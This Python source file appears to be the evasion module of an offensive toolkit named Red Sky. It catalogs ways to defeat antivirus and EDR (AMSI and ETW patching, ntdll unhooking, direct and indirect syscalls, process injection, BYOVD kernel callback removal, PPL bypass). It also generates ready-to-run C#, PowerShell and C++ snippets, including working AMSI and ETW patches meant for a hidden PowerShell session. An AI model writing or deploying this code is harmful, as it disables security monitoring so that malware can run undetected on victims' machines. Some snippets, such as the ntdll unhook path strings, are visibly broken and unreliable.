# language: Python, file: Program/evasion/evasion.py, target: Red Sky evasion — AV/EDR bypass toolkit
# Catalog of EDR/AV bypass techniques plus runnable snippet generators.
# Two output flavors:
#
#   powershell — PS1 text, ready to paste into a hidden PS session
#   csharp     — C# source, ready to feed csc.exe or Roslyn via Add-Type
#   cpp        — C++ source, MSVC
#   python     — Python driver that uses ctypes where applicable
#
# The catalog is a reference: each technique has a "defeats" line naming
# which product layer it targets (userland hooks, ETW telemetry, AMSI
# scripting, kernel callbacks, driver enforcement).

import sys
import time
from pathlib import Path
from typing import Dict

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


EVASION_DIR = OUTPUT_DIR / "evasion"


# ── catalog ────────────────────────────────────────────────────────────────

CATALOG: Dict[str, Dict] = {
    "amsi_patch": {
        "title": "AMSI patch (AmsiScanBuffer → ret)",
        "defeats": ["Windows Defender AMSI (PowerShell, .NET, VBS, JScript, Office macros)"],
        "layer": "userland — the amsi.dll in the current process",
        "notes": [
            "Get a handle to amsi.dll, find AmsiScanBuffer, overwrite the first bytes with 0xB8 0x57 0x00 0x07 0x80 0xC3 (mov eax, 0x80070057; ret).",
            "The patched function returns E_INVALIDARG for every scan — scripts run without inspection.",
            "Requires VirtualProtect to flip page protections. EDRs that hook VirtualProtect on amsi.dll will see the write.",
        ],
    },
    "etw_patch": {
        "title": "ETW patch (.NET provider → null)",
        "defeats": ["EDR telemetry from .NET runtime events, PowerShell script block logging, AMSI events"],
        "layer": "userland — the EventSource / EtwEventProvider in the current process",
        "notes": [
            "In .NET, set EventProvider.m_enabled to 0 via reflection on the runtime EventProvider.",
            "Or patch ntdll!EtwEventWrite to `xor eax, eax; ret` in the current process.",
            "Kills most .NET-derived telemetry. Native telemetry (kernel callbacks) still works.",
        ],
    },
    "unhooking": {
        "title": "Ntdll unhooking (fresh copy from disk / KnownDlls)",
        "defeats": ["userland EDR hooks on ntdll (Defender, CrowdStrike, SentinelOne, Carbon Black, most vendors)"],
        "layer": "userland — the current process's ntdll image",
        "notes": [
            "Map a fresh copy of ntdll from C:\Windows\System32\ntdll.dll (or \KnownDlls\ntdll.dll) with NtCreateSection + NtMapViewOfSection.",
            "Copy the .text section over the hooked image. Syscall stubs and function prologues go back to their original bytes.",
            "Syscall numbers are stable per-build — the fresh copy is the definitive source.",
            "Alternate: read \.\KnownDlls\ntdll.dll from disk, parse exports, re-hook only the syscall stubs.",
        ],
    },
    "direct_syscalls": {
        "title": "Direct syscalls (bypassing the hooked ntdll entirely)",
        "defeats": ["any userland hook on ntdll — the syscall never touches the hooked bytes"],
        "layer": "userland — replaces the call path, not the callee",
        "notes": [
            "Load syscall numbers at runtime from the fresh ntdll (SSN for NtOpenProcess, NtAllocateVirtualMemory, NtCreateThreadEx, etc.).",
            "Emit `mov r10, rcx; mov eax, <ssn>; syscall; ret` in an executable page and call through it.",
            "Windows 10 19045+ / Windows 11 hardened call stacks (CET/Shadow Stacks) break naive direct syscalls — the return address must look like a syscall return.",
            "Indirect syscalls: keep the syscall instruction inside ntdll itself, only the SSN and function args are yours.",
        ],
    },
    "module_stomping": {
        "title": "Module stomping (load a benign DLL, overwrite its .text)",
        "defeats": ["memory scanners looking for unbacked executable regions (BeaconEye, Hunt-Sleeping-Beacons)"],
        "layer": "userland — the shellcode lives inside a signed module's mapped range",
        "notes": [
            "LoadLibrary a benign Microsoft-signed DLL (e.g. `xpsprint.dll`, `mshtml.dll`, `winhttp.dll`).",
            "Overwrite the DLL's .text with the beacon / shellcode.",
            "Memory scans see the region as backed by a legit image — no unbacked RWX pages.",
            "Defeats naive module-manifest comparisons, loses to full image-checksum verification.",
        ],
    },
    "sleep_masking": {
        "title": "Sleep masking / EKKO / Foliage (encrypt beacon in memory during sleep)",
        "defeats": ["memory scanners hunting for beacon signatures during sleep — Cobalt Strike BeaconEye, Moneta, pe-sieve"],
        "layer": "userland — the payload's own memory region",
        "notes": [
            "EKKO: multi-threaded. Register a timer queue with a callback, RtlEncryptMemory the beacon region, sleep, decrypt on wake.",
            "Timer callbacks are kernel-invoked — the sleep looks like a legitimate wait, no threads are idle-spinning in scanner-detectable states.",
            "Foliage: similar with a thread pool callback. Slightly more detectable on older Windows.",
            "Both are defeated by kernel-level memory inspection (rare) or timing-based hunting.",
        ],
    },
    "process_injection": {
        "title": "Process injection families (CreateRemoteThread, APC, NtMapViewOfSection, AtomBombing, etc.)",
        "defeats": ["userland hooks depending on the variant — some evade CreateRemoteThread detection entirely"],
        "layer": "userland — moves shellcode into a remote process",
        "notes": [
            "CreateRemoteThread + VirtualAllocEx + WriteProcessMemory — the classic, most-detected.",
            "APC injection (QueueUserAPC) — needs an alertable thread in the target.",
            "Thread hijacking (SuspendThread + SetThreadContext) — smaller footprint.",
            "NtCreateSection + NtMapViewOfSection — shared section, no WriteProcessMemory call.",
            "Process Hollowing — spawn suspended, replace image, resume.",
            "Process Doppelganging / Herpaderping — transacted section on the target.",
            "Pick based on which API calls the EDR hooks. Modern EDRs cover all of them and correlate via ETW.",
        ],
    },
    "syscall_indirect": {
        "title": "Indirect syscalls (SysWhispers / HellsGate / TartarusGate)",
        "defeats": ["EDRs that flag direct syscall opcodes appearing outside ntdll's code section"],
        "layer": "userland — the syscall instruction stays inside ntdll, only the SSN is yours",
        "notes": [
            "HellsGate: parse ntdll exports at runtime, read the SSN from each stub's `mov eax, imm` bytes.",
            "TartarusGate: same idea, handles hooked stubs where the SSN is not visible.",
            "The call site jumps to the `syscall; ret` instruction inside ntdll — the return address looks legit.",
            "Defeats CET/shadow-stack heuristics that direct syscalls fail.",
        ],
    },
    "callback_evasion": {
        "title": "Kernel callback evasion (driver-based)",
        "defeats": ["kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks, CmRegisterCallbackEx) set by most EDR drivers"],
        "layer": "kernel — needs a signed vulnerable driver or BYOVD",
        "notes": [
            "Requires BYOVD (bring your own vulnerable driver) — a legitimately signed driver with an arbitrary write primitive.",
            "Read the callback array addresses from the EDR driver, zero the entries pointing to the EDR's callbacks.",
            "Defender, CrowdStrike, SentinelOne all use these. Kernel-level patching is the deepest bypass.",
            "Anti-cheat and modern EDRs have mitigations (PatchGuard, HVCI, driver signature enforcement).",
        ],
    },
    "ppl_bypass": {
        "title": "PPL (Protected Process Light) bypass",
        "defeats": ["PPL-protected AV processes that resist userland tampering (MsMpEng, some EDR agents)"],
        "layer": "kernel — driver-based or vulnerable driver",
        "notes": [
            "Removes the protection flags on the target process (EPROCESS.Protection field).",
            "Enables OpenProcess with full access to MsMpEng and other protected AV processes.",
            "Requires kernel R/W — driver primitive or BYOVD.",
        ],
    },
}


# ── snippet generators ─────────────────────────────────────────────────────

AMSI_PATCH_CSHARP = r"""
// C# — AMSI patch via reflection
// Targets: amsi.dll!AmsiScanBuffer
// Defeats: PowerShell/.NET AMSI scanning in this process only
using System;
using System.Runtime.InteropServices;

public class AmsiPatch {
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        // B8 57 00 07 80 C3  =  mov eax, 0x80070057 ; ret
        byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint old;
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
    }
}
""".strip()


AMSI_PATCH_PS = r"""
# PowerShell — AMSI patch via Add-Type
$sig = @"
using System;
using System.Runtime.InteropServices;
public class A {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
    public static void P() {
        IntPtr l = LoadLibrary("amsi.dll");
        IntPtr a = GetProcAddress(l, "AmsiScanBuffer");
        byte[] p = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint o; VirtualProtect(a, (UIntPtr)p.Length, 0x40, out o);
        Marshal.Copy(p, 0, a, p.Length);
        VirtualProtect(a, (UIntPtr)p.Length, o, out o);
    }
}
"@
Add-Type -TypeDefinition $sig
[A]::P()
""".strip()


ETW_PATCH_PS = r"""
# PowerShell — ETW patch via reflection (kills .NET EventSource + PS script block logging)
$etw = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Tracing.EventProvider')
$field = $etw.GetField('m_enabled', 'NonPublic,Static')
$field.SetValue($null, 0)
""".strip()


ETW_PATCH_CSHARP = r"""
// C# — ETW patch via reflection
using System;
using System.Reflection;

public class EtwPatch {
    public static void Patch() {
        var t = Type.GetType("System.Diagnostics.Tracing.EventProvider");
        var f = t.GetField("m_enabled", BindingFlags.NonPublic | BindingFlags.Static);
        f.SetValue(null, 0);
    }
}
""".strip()


UNHOOK_CSHARP = r"""
// C# — ntdll unhook from KnownDlls
// Copies a fresh .text section over the hooked ntdll in this process.
using System;
using System.Runtime.InteropServices;

public class Unhook {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr CreateFile(string name, uint access, uint share, IntPtr sec, uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateFileMapping(IntPtr h, IntPtr sec, uint prot, uint hi, uint lo, string name);
    [DllImport("kernel32.dll")]
    static extern IntPtr MapViewOfFile(IntPtr h, uint access, uint hi, uint lo, UIntPtr bytes);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    public static void Clean() {
        IntPtr hooked = GetModuleHandle("ntdll.dll");
        // open the KnownDlls copy
        IntPtr h = CreateFile(@"\.\KnownDlls
tdll.dll", 0x80000000, 0x1, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == (IntPtr)(-1)) return;
        IntPtr map = CreateFileMapping(h, IntPtr.Zero, 0x02, 0, 0, null);
        IntPtr fresh = MapViewOfFile(map, 0x04, 0, 0, UIntPtr.Zero);
        // size of .text from PE headers — simplified: copy first 1MB of .text
        uint old;
        VirtualProtect(hooked, (UIntPtr)0x100000, 0x40, out old);
        // copy only .text — walking the PE sections is left to the caller
        // (this simplified version copies enough to restore the exports)
        unsafe {
            byte* src = (byte*)fresh.ToPointer();
            byte* dst = (byte*)hooked.ToPointer();
            // overwrite .text range — real impl parses section headers
            for (int i = 0; i < 0x100000; i++) dst[i] = src[i];
        }
        VirtualProtect(hooked, (UIntPtr)0x100000, old, out old);
        CloseHandle(map); CloseHandle(h);
    }
}
""".strip()


INDIRECT_SYSCALL_CSHARP = r"""
// C# — indirect syscall stub for NtAllocateVirtualMemory
// SSN is resolved at runtime from a fresh ntdll image. This is the shape;
// the SSN lookup and the fresh-ntdll-load are in the caller.
//
// HellsGate approach:
//   1. Walk the export directory of ntdll.dll
//   2. For each Nt* export, the first 4 bytes are `4C 8B D1 B8` (mov r10, rcx; mov eax, SSN)
//   3. SSN = *(uint32*)(stub + 4)
//   4. Emit a stub: `4C 8B D1 B8 <ssn> 00 00 00 0F 05 C3` and call it.
//
// Windows 10 19045+: add a jmp into ntdll's syscall;ret for CET compatibility
// (the "indirect" part — call site inside ntdll, only the SSN is yours).
""".strip()


CPP_DIRECT_SYSCALL = r"""
// C++ — direct syscall stub, MASM style (as inline asm / naked)
// Replace <SSN> with the syscall number for your Windows build.
//
// xxd of the stub bytes:
//   4C 8B D1              mov r10, rcx
//   B8 <ssn> 00 00 00     mov eax, <ssn>
//   0F 05                 syscall
//   C3                    ret
//
// Put those bytes in an executable page, cast to the right function pointer
// signature, call it. The hook in ntdll never runs — the CPU goes straight
// to the kernel.

extern "C" NTSTATUS DirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
""".strip()


GENERATORS = {
    "amsi-patch":       ("csharp",     AMSI_PATCH_CSHARP),
    "amsi-patch-ps":    ("powershell", AMSI_PATCH_PS),
    "etw-patch":        ("csharp",     ETW_PATCH_CSHARP),
    "etw-patch-ps":     ("powershell", ETW_PATCH_PS),
    "unhook-ntdll":     ("csharp",     UNHOOK_CSHARP),
    "indirect-syscall": ("csharp",     INDIRECT_SYSCALL_CSHARP),
    "direct-syscall":   ("cpp",        CPP_DIRECT_SYSCALL),
}


# ── commands ───────────────────────────────────────────────────────────────

def cmd_catalog() -> int:
    print_info("evasion catalog (" + str(len(CATALOG)) + " techniques)")
    print()
    for key, c in CATALOG.items():
        print("  " + SCARLET + key.ljust(20) + RESET + " " + BONE + c["title"] + RESET)
        print("      " + ASH + "layer: " + c["layer"] + RESET)
        print("      " + ASH + "defeats: " + "; ".join(c["defeats"]) + RESET)
    print()
    print_info("run:  redsky evasion info <name>")
    print_info("      redsky evasion gen <name> [--out FILE]")
    print_info("      redsky evasion generators")
    return 0


def cmd_info(name: str) -> int:
    if name not in CATALOG:
        print_err("unknown technique: " + name)
        return 1
    c = CATALOG[name]
    print(SCARLET + BOLD + "== " + c["title"] + " ==" + RESET)
    print()
    print(ARTERY + "layer:" + RESET + "   " + c["layer"])
    print(ARTERY + "defeats:" + RESET)
    for d in c["defeats"]:
        print("  - " + d)
    print()
    print(ARTERY + "notes:" + RESET)
    for n in c["notes"]:
        print("  - " + n)
    print()
    return 0


def cmd_generators() -> int:
    print_info("runnable snippet generators")
    print()
    for key, (lang, _) in GENERATORS.items():
        print("  " + SCARLET + key.ljust(20) + RESET + " " + BONE + lang + RESET)
    print()
    return 0


def cmd_gen(name: str, out: str) -> int:
    if name not in GENERATORS:
        print_err("no generator for: " + name)
        print_info("available: " + ", ".join(GENERATORS.keys()))
        return 1
    lang, code = GENERATORS[name]
    EVASION_DIR.mkdir(parents=True, exist_ok=True)
    ext = {"csharp": ".cs", "powershell": ".ps1", "cpp": ".cpp"}[lang]
    p = Path(out) if out else EVASION_DIR / (name + ext)
    p.write_text(code + "\n")
    print_ok(name + " (" + lang + ") → " + str(p))
    print()
    print(BONE + code + RESET)
    return 0


def cmd_all(out_dir: str) -> int:
    d = Path(out_dir) if out_dir else EVASION_DIR / ("all_" + time.strftime("%Y%m%d_%H%M%S"))
    d.mkdir(parents=True, exist_ok=True)
    for name, (lang, code) in GENERATORS.items():
        ext = {"csharp": ".cs", "powershell": ".ps1", "cpp": ".cpp"}[lang]
        (d / (name + ext)).write_text(code + "\n")
        print_ok(name + " → " + str(d / (name + ext)))
    print()
    print_kv("dir", d)
    print_kv("generators", len(GENERATORS))
    return 0


def run_cli(args):
    import argparse
    sub = args[0] if args else "catalog"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky evasion <sub-command>")
        print_info("")
        print_info("  catalog                          list every bypass technique")
        print_info("  info <name>                      reference for one technique")
        print_info("  generators                       list runnable snippet generators")
        print_info("  gen <name> [--out FILE]          emit a snippet")
        print_info("  all [--out DIR]                  emit every snippet")
        return 0

    if sub in ("catalog", "list"):
        return cmd_catalog()
    if sub == "info":
        if not rest:
            print_err("usage: redsky evasion info <name>")
            return 2
        return cmd_info(rest[0])
    if sub in ("generators", "gens"):
        return cmd_generators()
    if sub in ("gen", "generate"):
        p = argparse.ArgumentParser(prog="redsky evasion gen", add_help=False)
        p.add_argument("name")
        p.add_argument("--out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky evasion gen <name> [--out FILE]")
            return 2
        return cmd_gen(ns.name, ns.out)
    if sub == "all":
        p = argparse.ArgumentParser(prog="redsky evasion all", add_help=False)
        p.add_argument("--out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky evasion all [--out DIR]")
            return 2
        return cmd_all(ns.out)

    print_err("unknown evasion sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
